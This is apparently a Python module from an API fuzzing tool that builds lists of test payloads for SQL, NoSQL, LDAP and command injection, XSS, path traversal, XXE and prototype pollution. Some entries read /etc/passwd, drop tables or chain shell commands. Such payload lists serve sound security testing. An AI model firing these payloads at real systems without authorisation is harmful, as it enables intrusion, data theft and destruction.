"""
Intelligent payload generator for API fuzzing.

This module generates context-aware payloads for different types of
vulnerabilities and API contexts.
"""

import logging
from typing import Dict, List, Optional, Any
import random
import string
import json

from ..core.config import Config

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Generate context-aware payloads for fuzzing."""

    def __init__(self, config: Config):
        self.config = config
        self.payload_templates = self._load_payload_templates()

    def _load_payload_templates(self) -> Dict[str, List[str]]:
        """Load vulnerability payload templates."""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users--",
                "' UNION SELECT 1,2,3--",
                "' AND SLEEP(5)--",
                "' OR BENCHMARK(5000000,MD5(1))--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*)(cn=*))(&(objectClass=*"
            ],
            "nosql_injection": [
                "{'$ne': null}",
                "{'$gt': ''}",
                "{'$regex': '.*'}",
                "'; return db.users.find(); var dummy='",
                "';return(db.runCommand('find','users'));var foo='bar"
            ]
        }

    async def generate_all_payloads(self) -> List[str]:
        """Generate all available payloads."""
        all_payloads = []
        for payloads in self.payload_templates.values():
            all_payloads.extend(payloads)

        # Add generic fuzzing payloads
        all_payloads.extend(self._generate_generic_payloads())

        return all_payloads

    async def generate_parameter_payloads(self, parameter: str) -> List[str]:
        """Generate payloads specific to a parameter."""
        payloads = []

        # Add all vulnerability payloads
        for payload_list in self.payload_templates.values():
            payloads.extend(payload_list)

        # Add parameter-specific payloads
        if 'id' in parameter.lower():
            payloads.extend(self._generate_id_payloads())

        if 'email' in parameter.lower():
            payloads.extend(self._generate_email_payloads())

        if 'file' in parameter.lower() or 'path' in parameter.lower():
            payloads.extend(self.payload_templates["path_traversal"])

        return payloads

    async def generate_context_payloads(
            self,
            context: Dict[str, Any],
            parameters: List[str]
    ) -> List[str]:
        """Generate payloads based on endpoint context."""
        payloads = []

        # Database-specific payloads
        if context.get('database') == 'mysql':
            payloads.extend([
                "' AND SLEEP(5)--",
                "' OR BENCHMARK(5000000,MD5(1))--",
                "' UNION SELECT @@version--"
            ])
        elif context.get('database') == 'postgresql':
            payloads.extend([
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT version()--"
            ])
        elif context.get('database') == 'mongodb':
            payloads.extend(self.payload_templates["nosql_injection"])

        # Framework-specific payloads
        if context.get('framework') == 'php':
            payloads.extend([
                "<?php echo 'test'; ?>",
                "<?= phpinfo() ?>",
                "../../../etc/passwd"
            ])
        elif context.get('framework') == 'aspnet':
            payloads.extend([
                "<%=Response.Write('test')%>",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ])

        # Content-type specific payloads
        if context.get('content_type') == 'json':
            payloads.extend(self._generate_json_payloads())
        elif context.get('content_type') == 'xml':
            payloads.extend(self._generate_xml_payloads())

        # Add base payloads
        payloads.extend(await self.generate_all_payloads())

        return list(set(payloads))  # Remove duplicates

    def _generate_generic_payloads(self) -> List[str]:
        """Generate generic fuzzing payloads."""
        payloads = []

        # Special characters
        special_chars = ["'", '"', "`", ";", "&", "|", "<", ">", "%", "@", "#", "$"]
        payloads.extend(special_chars)

        # Boundary values
        boundary_values = [
            "0", "-1", "2147483647", "-2147483648",
            "999999999999999999999999999999",
            "0.0", "-0.0", "1.7976931348623157E+308",
            "null", "undefined", "NaN", "Infinity"
        ]
        payloads.extend(boundary_values)

        # Long strings
        payloads.extend([
            "A" * 100,
            "A" * 1000,
            "A" * 10000,
            "\x00" * 100,  # Null bytes
            "\xff" * 100  # High bytes
        ])

        # Format strings
        format_strings = [
            "%s", "%x", "%d", "%n",
            "%s%s%s%s%s%s%s%s%s%s",
            "%99999999999s",
            "%.999999999s"
        ]
        payloads.extend(format_strings)

        return payloads

    def _generate_id_payloads(self) -> List[str]:
        """Generate payloads for ID parameters."""
        return [
            "0", "-1", "999999999",
            "abc", "null", "undefined",
            "1'", "1\"", "1;",
            "1 OR 1=1",
            "1' OR '1'='1",
            "../1", "1/../2"
        ]

    def _generate_email_payloads(self) -> List[str]:
        """Generate payloads for email parameters."""
        return [
            "test@test.com",
            "invalid-email",
            "test@",
            "@test.com",
            "test..test@test.com",
            "test@test",
            "test@.com",
            "test@test..com",
            "test+tag@test.com",
            "test'@test.com",
            "test\"@test.com",
            "test<script>alert(1)</script>@test.com"
        ]

    def _generate_json_payloads(self) -> List[str]:
        """Generate JSON-specific payloads."""
        return [
            '{"test": "value"}',
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
            '{"__proto__": {"isAdmin": true}}',
            '[1,2,3,4,5]',
            '{"a": {"b": {"c": {"d": "deep"}}}}',
            '{"test": null}',
            '{"test": undefined}',
            '{"test": NaN}',
            '{"test": Infinity}'
        ]

    def _generate_xml_payloads(self) -> List[str]:
        """Generate XML-specific payloads."""
        return [
            '<?xml version="1.0"?><test>value</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<test><![CDATA[<script>alert(1)</script>]]></test>',
            '<test xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">value</test>',
            '<!-- XML comment -->',
            '<test>A' + 'A' * 10000 + '</test>'
        ]

    def generate_mutation_payloads(self, base_payload: str, mutation_type: str) -> List[str]:
        """Generate mutations of a base payload."""
        mutations = []

        if mutation_type == "case_variation":
            mutations.extend([
                base_payload.upper(),
                base_payload.lower(),
                base_payload.capitalize(),
                base_payload.swapcase()
            ])

        elif mutation_type == "encoding":
            mutations.extend([
                self._url_encode(base_payload),
                self._double_url_encode(base_payload),
                self._html_encode(base_payload),
                self._base64_encode(base_payload)
            ])

        elif mutation_type == "character_insertion":
            # Insert characters at random positions
            for _ in range(5):
                pos = random.randint(0, len(base_payload))
                char = random.choice(string.printable)
                mutation = base_payload[:pos] + char + base_payload[pos:]
                mutations.append(mutation)

        elif mutation_type == "character_deletion":
            # Delete characters at random positions
            for _ in range(min(5, len(base_payload))):
                if len(base_payload) > 1:
                    pos = random.randint(0, len(base_payload) - 1)
                    mutation = base_payload[:pos] + base_payload[pos + 1:]
                    mutations.append(mutation)

        elif mutation_type == "prefix_suffix":
            prefixes = ["", " ", "\t", "\n", "\r", "\x00"]
            suffixes = ["", " ", "\t", "\n", "\r", "\x00", "#", "--", "/*"]

            for prefix in prefixes:
                for suffix in suffixes:
                    mutations.append(prefix + base_payload + suffix)

        return mutations

    def _url_encode(self, text: str) -> str:
        """URL encode text."""
        import urllib.parse
        return urllib.parse.quote(text)

    def _double_url_encode(self, text: str) -> str:
        """Double URL encode text."""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(text))

    def _html_encode(self, text: str) -> str:
        """HTML encode text."""
        import html
        return html.escape(text)

    def _base64_encode(self, text: str) -> str:
        """Base64 encode text."""
        import base64
        return base64.b64encode(text.encode()).decode()

    def generate_polyglot_payloads(self) -> List[str]:
        """Generate polyglot payloads that work across multiple contexts."""
        return [
            # XSS/SQL/Command injection polyglot
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",

            # Multi-context polyglot
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/`/*\\x00${{console.log`${navigator.userAgent}`}};'>",

            # SQL/NoSQL polyglot
            "' OR 1=1 UNION SELECT 1,2,3--'; return true; var x='",

            # Universal bypass
            "<img src=x onerror=alert(1)>' OR '1'='1' AND 1=1--",

            # Command/SQL injection
            "'; ls -la; echo 'SQL: ' OR 1=1--"
        ]
